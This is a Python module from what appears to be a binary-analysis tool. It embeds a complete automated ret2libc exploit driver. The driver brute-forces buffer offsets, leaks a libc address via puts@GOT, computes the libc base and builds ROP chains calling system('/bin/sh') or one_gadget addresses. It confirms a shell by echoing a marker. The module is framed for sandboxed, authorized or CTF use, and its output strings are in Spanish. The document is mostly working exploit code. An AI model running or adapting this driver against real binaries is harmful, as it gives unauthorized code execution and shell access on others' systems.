"""ret2libc-with-leak, verified by getting a shell in the sandbox.

Stage 1 leaks a libc address (puts@GOT via puts@PLT) and returns to main; stage 2 uses the
computed libc base to call system('/bin/sh'). Runs inside the pwntools sandbox image
('binoracle-pwn') with ASLR disabled (setarch -R) so the two runs share a base. For
AUTHORIZED / CTF targets. Build the image once with: make pwn-image."""
from __future__ import annotations

from ._sandbox import run_driver

_DRIVER = r'''
import sys, subprocess, struct
from pwn import ELF, u64, ROP, context
context.log_level = "error"
p64 = lambda x: struct.pack("<Q", x)
name = sys.argv[1]
elf = ELF(name, checksec=False)
rop = ROP(elf)
g = rop.find_gadget(["pop rdi", "ret"]) or rop.find_gadget(["pop rdi"])
if not g or "puts" not in elf.plt:
    print("NOT_APPLICABLE (no pop rdi / no puts)"); sys.exit(1)
pr = g.address; ret = rop.find_gadget(["ret"]).address
puts_plt = elf.plt["puts"]; puts_got = elf.got["puts"]
reenter = elf.symbols.get("main") or elf.symbols.get("vuln")
OFF_CANDS = [88, 72, 80, 96, 104, 64, 120, 112, 128, 136, 56, 40]
READSZ = 4096
def run(inp):
    r = subprocess.run(["setarch", "-R", "./" + name], input=inp, capture_output=True, timeout=10)
    return r.stdout + r.stderr
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
puts_off = libc.symbols["puts"]; system_off = libc.symbols["system"]
binsh_off = next(libc.search(b"/bin/sh\x00"))
MARK = b"BINORACLE_LIBC_PWNED"
for OFF in OFF_CANDS:
    for a1 in (1, 0):
        s1 = b"A" * OFF + p64(ret) * a1 + p64(pr) + p64(puts_got) + p64(puts_plt) + p64(reenter)
        out = run(s1)
        parts = out.split(b"data: ") if b"data: " in out else [b"", out]
        leak = 0
        tail = parts[1] if len(parts) >= 2 else out
        for st in range(0, max(1, len(tail) - 5)):
            seg = tail[st:st + 6]
            if len(seg) == 6:
                v = u64(seg.ljust(8, b"\x00"))
                if 0x7f0000000000 < v < 0x800000000000:
                    leak = v; break
        if not leak:
            continue
        base = leak - puts_off
        system = base + system_off; binsh = base + binsh_off
        for a2 in (1, 0):
            chain = b"A" * OFF + p64(ret) * a2 + p64(pr) + p64(binsh) + p64(system)
            inp = chain.ljust(READSZ, b"A") + b"\n echo " + MARK + b"\n"
            if MARK in run(inp):
                print("VERIFIED off=%d leak=%#x base=%#x system=%#x" % (OFF, leak, base, system))
                sys.exit(0)
        # fallback: one_gadget (single magic libc address that spawns a shell)
        try:
            import subprocess as _sp
            ogs = [int(x, 0) for x in _sp.run(["one_gadget", "--raw", libc.path],
                   capture_output=True, text=True, timeout=30).stdout.split()]
        except Exception:
            ogs = []
        for og in ogs:
            for a2 in (0, 1):
                chain = b"A" * OFF + p64(ret) * a2 + p64(base + og)
                inp = chain.ljust(READSZ, b"A") + b"\n echo " + MARK + b"\n"
                if MARK in run(inp):
                    print("VERIFIED off=%d one_gadget=%#x base=%#x" % (OFF, base + og, base))
                    sys.exit(0)
print("NOT_VERIFIED")
sys.exit(1)
'''


def autolibc(binary: str, run: bool = True) -> dict:
    res = run_driver(binary, _DRIVER, ".binoracle_libc.py")
    if not res.get("ok"):
        return res
    eng = res.get("engine", "sandbox")
    res["note"] = (f"ret2libc con leak: shell verificada por ejecucion ({eng})"
                   if res.get("verified")
                   else f"ret2libc: no verificado ({eng}) (sin leak/gadget aplicable o timing)")
    return res


def render_libc(r: dict) -> str:
    out = ["## Auto ret2libc (leak + system, verificado)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- shell verificada en sandbox: **{'SI' if r.get('verified') else 'no'}**")
    if r.get("detail"):
        out.append(f"- {r['detail']}")
    out.append(f"- {r.get('note','')}")
    if r.get("output"):
        out.append("\n### salida\n```\n" + r["output"].strip() + "\n```")
    return "\n".join(out)
